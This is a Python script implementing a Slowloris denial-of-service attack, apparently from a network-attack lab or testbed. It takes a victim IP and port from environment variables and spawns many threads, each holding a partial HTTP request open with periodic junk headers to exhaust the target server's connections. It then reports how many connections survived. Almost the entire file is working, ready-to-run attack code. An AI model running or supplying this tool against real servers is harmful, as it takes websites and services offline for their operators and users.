"""
HTTP Slowloris attacker — opens many partial HTTP connections and holds
them open with periodic keep-alive headers.

Configured via environment variables:
    TARGET_IP       victim IP (required)
    TARGET_PORT     victim HTTP port (default: 80)
    DURATION_SEC    total attack duration (default: 30)
    NUM_CONNECTIONS number of parallel slow connections (default: 200)

Unlike SYN/UDP flood, Slowloris operates at the application layer using
real TCP connections. Each worker thread owns one connection, sends a
partial HTTP request, then drips a harmless header every ~15 seconds to
prevent the server from timing out.
"""

import os
import sys
import time
import socket
import threading
import random


def parse_env() -> tuple[str, int, int, int]:
    """Read TARGET_IP, TARGET_PORT, DURATION_SEC, NUM_CONNECTIONS."""
    # Read TARGET_IP from environment
    target_ip = os.environ.get("TARGET_IP")

    # Print error and exit if missing.
    if target_ip is None:
        print("[slowloris] error: TARGET_IP not set", file=sys.stderr)
        sys.exit(1)

    # Convert TARGET_PORT, DURATION_SEC, NUM_CONNECTIONS to integers, with defaults.
    # All three int vars wrapped in one try/except for ValueError.
    try:
        target_port = int(os.environ.get("TARGET_PORT", "80"))
        duration_sec = int(os.environ.get("DURATION_SEC", "30"))
        num_connections = int(os.environ.get("NUM_CONNECTIONS", "200"))
    except ValueError as e:
        print(f"Invalid environment variable: {e}", file=sys.stderr)
        sys.exit(1)
    return target_ip, target_port, duration_sec, num_connections


def worker(target_ip: str, target_port: int, stop_event: threading.Event, results: list) -> None:
    """Open one slow connection and keep it alive until stop_event is set.

    Steps:
      1. Create a TCP socket and connect to (target_ip, target_port).
      2. Send a partial HTTP request: method line + Host header only,
         NOT ending with the blank line that would complete the request.
      3. Loop: every ~15 seconds, send one harmless header line to
         keep the server from timing out the connection. Check stop_event
         between sleeps so we can shut down cleanly.
      4. When stop_event is set, close the socket and return.

    Any socket exception (connection refused, broken pipe) means our
    connection got killed — just return quietly. We'll have plenty of
    surviving connections, we don't need to retry.
    """
    status = "survived"
    sock = None
    try:
        # 1. Create socket, connect to target
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        sock.connect((target_ip, target_port))

        # 2. Send partial HTTP request — method line, host, user-agent.
        #    Crucially: NO final \r\n\r\n, so the server thinks headers
        #    are still incoming.
        sock.send(
            f"GET /?{random.randint(0,10000)} HTTP/1.1\r\n"
            f"Host: {target_ip}\r\n"
            f"User-Agent: Mozilla/5.0\r\n".encode()
        )
        # 3. Keep-alive loop — send one harmless header every ~15 seconds
        #    until stop_event is set. Use event.wait(15) not sleep(15).
        while not stop_event.wait(15):
            sock.send(f"X-a: {random.randint(1, 10000)}\r\n".encode())
        
        #4. clean shutdown
        sock.close()

    except OSError as e:
        # Connection died (server killed it, network issue, timeout, etc.)
        # Just return quietly — we don't need to retry.
        status = f"died: {e}"
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass
    results.append(status)


def slowloris(target_ip: str, target_port: int, duration_sec: int,
              num_connections: int) -> int:
    """Spawn num_connections worker threads, run for duration_sec, stop them.

    Returns the number of threads that were successfully started.
    """
    # Steps:
    #   1. Create a threading.Event. Workers check this to know when to stop.
    #   2. Spawn num_connections threads, each running worker(...).
    #      Use daemon=True so they don't block the program from exiting.
    #   3. Sleep for duration_sec.
    #   4. Set the stop_event. Workers notice on their next loop check.
    #   5. Return the count of threads we started.
    stop_event = threading.Event()
    results = []
    threads = []

    #spawn workers
    for _ in range(num_connections):
        t = threading.Thread(
            target = worker,
            args=(target_ip, target_port, stop_event, results),
            daemon=True
        )
        t.start()
        threads.append(t)

    # Start the attack
    time.sleep(duration_sec)

    # Signal all workers to stop
    stop_event.set()

    # Wait for workers to finish (with a timeout so we don't hang)
    for t in threads:
        t.join(timeout=5)
    
    # Summarize
    survived = results.count("survived")
    died = len(results) - survived
    print(f"[slowloris] {survived} connections survived, {died} died")

    return survived


def main() -> int:
    target_ip, target_port, duration_sec, num_connections = parse_env()
    print(f"[slowloris] target={target_ip}:{target_port} "
          f"connections={num_connections} duration={duration_sec}s")
    start = time.time()
    started = slowloris(target_ip, target_port, duration_sec, num_connections)
    elapsed = time.time() - start
    print(f"[slowloris] held {started} connections for {elapsed:.1f}s")
    return 0


if __name__ == "__main__":
    sys.exit(main())